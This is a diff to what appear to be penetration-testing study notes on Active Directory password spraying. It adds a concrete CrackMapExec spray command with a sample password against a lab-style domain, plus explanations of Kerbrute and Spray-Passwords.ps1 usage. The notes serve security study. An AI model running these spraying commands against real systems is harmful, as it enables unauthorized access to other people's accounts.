@@ -74,9 +74,10 @@ Second, detect if the SMB signing is disabled. When SMB signing is disabled, an 
 
 - Spray with Crackmapexec using known password on list of found usernames
 ```bash
-# Crackmapexec uses SMB - check if the output shows 'Pwned!'
+# Crackmapexec uses SMB - check if the output shows 'Pwn3d!' Pwn3d!== that account pawned as admin access!
 # protocols = smb, winrm, 
 # --continue-on-success to avoid stopping at the first valid credentials.
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
 crackmapexec <protocol> <target(s)> -u username1 -p password1 password2 --no-bruteforce
 crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
 crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords  --continue-on-success 
@@ -88,11 +89,12 @@ crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_con
 ```
 
 - Spray with Kerbrute
+- Principle is if username and password is correct, we will obtain a TGT. Kerbrute will test all username and password and return us with success if TGT is obtained with a valid username and password
 ```bash
 kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 ```
 
-- Brute force small number of guess passwords on list of found usernames (tool: Spray-Passwords.ps1)
+- Brute force small number of guess passwords on list of found usernames (tool: Spray-Passwords.ps1) (For LDAP and ADSI protocol)
   ```bash
   .\Spray-Passwords.ps1
   .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
